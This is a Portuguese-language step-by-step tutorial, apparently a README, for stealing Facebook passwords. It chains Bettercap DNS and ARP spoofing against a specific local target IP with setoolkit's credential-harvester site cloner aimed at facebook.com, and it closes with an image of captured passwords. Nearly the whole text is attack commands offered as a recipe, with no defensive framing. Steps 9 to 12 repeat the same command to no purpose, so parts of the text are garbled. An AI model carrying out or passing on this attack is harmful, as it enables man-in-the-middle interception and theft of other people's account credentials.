# Phishing para captura de senhas do Facebook

### Ferramentas

- Kali Linux (Sistema Operacional)
- setoolkit (ferramenta para captura dos dados - nativo do Kali Linux)
- Bettercap (ferramenta para mascarar URL com DNS spoof)

### Atualização e instalação de ferramentas no Kali Linux

- Passo 1 - Acesso root: ``` sudo su ```
- Passo 2 - Atualizando sistema operacional e repositórios: ``` apt update && sudo apt upgrade -y ```
- Passo 3 - Instalando o Bettercap: ``` apt install bettercap -y ```

### Configurando o DNS spoof no Bettercap

- Passo 1 - Verificando qual o nome da interface de rede: ``` ip a ```
- Passo 2 - Obtendo o endereço da máquina: ``` ifconfig ```
- Passo 3 - Executando o Bettercap no modo interativo: ``` bettercap -iface eth0 ```
- Passo 4 - Definindo o domínio a ser redirecionado: ``` set dns.spoof.domains http://face.book.com ```
- Passo 5 - Definindo o endereço de acesso da página: ``` set dns.spoof.address 192.168.1.13 ```
- Passo 6 - Ativando o DNS spoof: ``` dns.spoof on ```
- Passo 7 - Definindo o alvo do spoofing: ``` set arp.spoof.targets 192.168.1.11 ```
- Passo 8 - Ativando spoofing ARP (ataque MITM): ``` arp.spoof on ```
- Passo 9 - ``` arp.spoof on ```
- Passo 10 - ``` arp.spoof on ```
- Passo 11 - ``` arp.spoof on ```
- Passo 12 - ``` arp.spoof on ```

### Configurando o Phishing no setoolkit

- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` 1) Social-Engineering Attacks ```
- Vetor de ataque: ``` 2) Web Site Attack Vectors ```
- Método de ataque: ``` 3) Credential Harvester Attack Method ```
- Método de ataque: ``` 2) Site Cloner ```
- URL para clone: http://www.facebook.com

### Resultados

![Alt text](./passwd.png "Optional title")
